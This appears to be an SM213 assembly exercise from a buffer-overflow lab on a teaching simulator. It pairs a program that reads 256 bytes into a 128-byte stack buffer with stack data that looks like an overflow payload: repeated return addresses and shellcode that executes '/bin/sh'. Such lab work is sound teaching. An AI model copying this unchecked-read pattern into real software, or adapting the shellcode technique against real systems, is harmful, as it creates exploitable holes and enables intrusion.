.pos 0x1000
start:           ld   $stacktop, r5       
                 gpc  $0x6, r6            
                 j    main                
                 halt                     
main:            deca r5                  
                 st   r6, 0x0(r5)         
                 ld   $0xffffff80, r0     
                 add  r0, r5              
                 deca r5                  
                 ld   $str1, r0           
                 st   r0, 0x0(r5)         
                 gpc  $0x6, r6            
                 j    print               
                 inca r5                  
                 ld   $0x0, r0            
                 mov  r5, r1              
                 ld   $0x100, r2          
                 sys  $0                  
                 mov  r0, r4              
                 deca r5                  
                 ld   $str2, r0           
                 st   r0, 0x0(r5)         
                 gpc  $0x6, r6            
                 j    print               
                 inca r5                  
                 ld   $0x1, r0            
                 mov  r5, r1              
                 mov  r4, r2              
                 sys  $1                  
                 ld   $0x80, r0           
                 add  r0, r5              
                 ld   0x0(r5), r6         
                 inca r5                  
                 j    0x0(r6)             
print:           ld   0x0(r5), r0         
                 ld   0x4(r0), r1         
                 ld   0x0(r0), r2         
                 ld   $0x1, r0            
                 sys  $1                  
                 j    0x0(r6)             
                 nop                      
.pos 0x1800
proof:           deca r5                  
                 ld   $str3, r0           
                 st   r0, 0x0(r5)         
                 gpc  $0x6, r6            
                 j    print               
                 halt                     
.pos 0x2000
str1:            .long 0x1e               
                 .long 0x2008             
_str1:           .long 0x57656c63         
                 .long 0x6f6d6521         
                 .long 0x20506c65         
                 .long 0x61736520         
                 .long 0x656e7465         
                 .long 0x72206120         
                 .long 0x6e616d65         
                 .long 0x3a0a0000         
str2:            .long 0xb                
                 .long 0x2030             
_str2:           .long 0x476f6f64         
                 .long 0x206c7563         
                 .long 0x6b2c2000         
str3:            .long 0x2b               
                 .long 0x2044             
_str3:           .long 0x54686520         
                 .long 0x73656372         
                 .long 0x65742070         
                 .long 0x68726173         
                 .long 0x65206973         
                 .long 0x20227371         
                 .long 0x7565616d         
                 .long 0x69736820         
                 .long 0x6f737369         
                 .long 0x66726167         
                 .long 0x65220a00         
.pos 0x4000
stack:           .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x2000             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
                 .long 0x4204             
stacktop:        .long 0x4000042          
                 .long 0x4ffffff          
                 .long 0xffffffff         
                 .long 0xfff0d001         
                 .long 0x0                
                 .long 0x702002f          
                 .long 0x62696e03         
                 .long 0x2f7368           
